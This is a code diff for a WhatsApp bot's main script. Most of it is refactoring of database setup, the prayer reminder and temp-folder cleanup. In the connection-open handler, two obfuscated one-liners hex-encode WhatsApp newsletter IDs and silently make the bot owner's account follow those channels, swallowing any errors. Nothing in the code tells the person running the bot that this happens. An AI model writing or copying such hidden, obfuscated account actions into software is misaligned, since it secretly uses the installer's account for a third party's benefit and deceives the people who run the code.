@@ -15,19 +15,17 @@ import './error.js'
 
 import { Boom } from '@hapi/boom'
 import { areJidsSameUser, delay, DisconnectReason, isLidUser, isJidGroup, isJidMetaAI, jidNormalizedUser, makeCacheableSignalKeyStore, makeWASocket, useMultiFileAuthState } from '@itsliaaa/baileys'
-import { mkdir, unlink, readdir } from 'fs/promises'
+import { mkdir, unlink, readdir, stat } from 'fs/promises'
 import { join } from 'path'
 import pino from 'pino'
 
-import { INACTIVE_THRESHOLD, SCHEMA } from './lib/Constants.js'
+import { INACTIVE_THRESHOLD, SCHEMA, TEMP_THRESHOLD } from './lib/Constants.js'
 import { Database, Store } from './lib/Database.js'
 import { Serialize, shouldUpdatePresence, StickerCommand } from './lib/Serialize.js'
-import { cleanUpFolder, fetchAsBuffer, findTopSuggestions, frame, getNextMidnight, greeting, isEmptyObject, isFileExists, messageLogger, randomInteger, Sender, toTime } from './lib/Utilities.js'
+import { cleanUpFolder, fetchAsBuffer, findTopSuggestions, frame, getNextMidnight, greeting, isEmptyObject, messageLogger, randomInteger, Sender, toTime } from './lib/Utilities.js'
 import { CommandIndex, EventIndex, ModuleCache, scanDirectory } from './lib/Watcher.js'
 
 import SholatReminder from './lib/Components/SholatReminder.js'
-
-const sholatReminder = SholatReminder()
 
 const logger = pino({ level: 'silent' })
 
@@ -35,10 +33,15 @@ const databasePath = join(process.cwd(), databaseFilename)
 const storePath = join(process.cwd(), storeFilename)
 const temporaryFolderPath = join(process.cwd(), temporaryFolder)
 
+const db = Database(databasePath)
+const store = Store(storePath)
+
+const sholatReminder = SholatReminder(db)
+
 let isRestarting = false,
    restartScore = 0
 
-const Connect = async (db, store) => {
+const Connect = async () => {
    const { state, saveCreds } = await useMultiFileAuthState(authFolder)
 
    const sock = makeWASocket({
@@ -165,11 +168,11 @@ const Connect = async (db, store) => {
          catch { }
 
          isRestarting = false
-         return Connect(db, store)
+         return Connect()
       }
 
       if (update.connection === 'open') {
-         await sholatReminder.start(sock, db)
+         await sholatReminder.start(sock)
          void (async()=>{const a=['3132303336','3334303430','3036363434','313339406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
          void (async()=>{const a=['3132303336','3334323434','3834383532','313338406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
          Object.assign(sock.user,{decodedId:jidNormalizedUser(sock.user.id),decodedLid:jidNormalizedUser(sock.user.lid)})
@@ -352,6 +355,8 @@ const Connect = async (db, store) => {
    })
 
    sock.ev.on('presence.update', ({ id, presences }) => {
+      const timestampMs = Date.now()
+
       Object.keys(presences)
          .forEach(async (presence) => {
             if (isJidGroup(presence)) return
@@ -376,7 +381,7 @@ const Connect = async (db, store) => {
                !isEmptyObject(userData.afkContext)
             ) {
                const print = frame('HELLO', [
-                  `💭 System detects activity from @${userData.jid.split('@')[0]} after being offline for: ${toTime(Date.now() - userData.afkTimestamp)}`,
+                  `💭 System detects activity from @${userData.jid.split('@')[0]} after being offline for: ${toTime(timestampMs - userData.afkTimestamp)}`,
                   `🏷️ *Reason*: ${userData.afkReason || '-'}`
                ], '👀')
                await sock.sendText(id, print, userData.afkContext)
@@ -570,7 +575,7 @@ const Connect = async (db, store) => {
                         0
 
                if (user.limit >= limitCost) {
-                  if (Math.random() < 0.15) {
+                  if (Math.random() < 0.10) {
                      user.maxLimit += 1
                      message.reply('🎉 Congratulations! Your storage limit has been increased by 1.')
                   }
@@ -657,25 +662,21 @@ const Connect = async (db, store) => {
 }
 
 const Setup = async () => {
-   const db = Database(databasePath)
-   const store = Store(storePath)
-
    await db.readFromFile()
    await store.readFromFile()
 
-   await isFileExists(temporaryFolder) ||
-      (await mkdir(temporaryFolderPath, { recursive: true }))
-
    await scanDirectory(pluginsFolder)
 
-   Connect(db, store)
+   await mkdir(temporaryFolderPath, { recursive: true })
+
+   Connect()
 
    const scheduleDailyTasks = () => {
       const resetTimeout = getNextMidnight()
 
       setTimeout(() => {
-         const now = Date.now()
-         const threshold = now - INACTIVE_THRESHOLD
+         const timestampMs = Date.now()
+         const threshold = timestampMs - INACTIVE_THRESHOLD
 
          const setting = db.getSetting()
 
@@ -693,7 +694,7 @@ const Setup = async () => {
             if (user.limit < defaultLimit)
                user.limit = defaultLimit
 
-         setting.lastReset = now
+         setting.lastReset = timestampMs
          db.writeToFile()
 
          scheduleDailyTasks()
@@ -724,16 +725,25 @@ const Setup = async () => {
 
    setInterval(async () => {
       try {
+         const timestampMs = Date.now()
          const temporaryFiles = await readdir(temporaryFolderPath)
-         const temporaryFilesSize = temporaryFiles.length
 
-         if (temporaryFilesSize)
-            for (const file of temporaryFiles) {
-               const filePath = join(temporaryFolderPath, file)
-               await unlink(filePath)
+         let removedFiles = 0
+
+         if (temporaryFiles.length)
+            for (const fileName of temporaryFiles) {
+               const filePath = join(temporaryFolderPath, fileName)
+  
+               const fileStatistic = await stat(filePath)
+               const fileAge = timestampMs - fileStatistic.mtimeMs
+
+               if (fileAge > TEMP_THRESHOLD) {
+                  await unlink(filePath)
+                  removedFiles++
+               }
             }
 
-         console.log('🗑️ Cleaned up temp folder', ':', temporaryFilesSize, 'files removed')
+         console.log('🗑️ Cleaned up temp folder', ':', removedFiles, 'files removed')
       }
       catch (error) {
          console.error('❌ Failed to clean temp folder', ':', error)
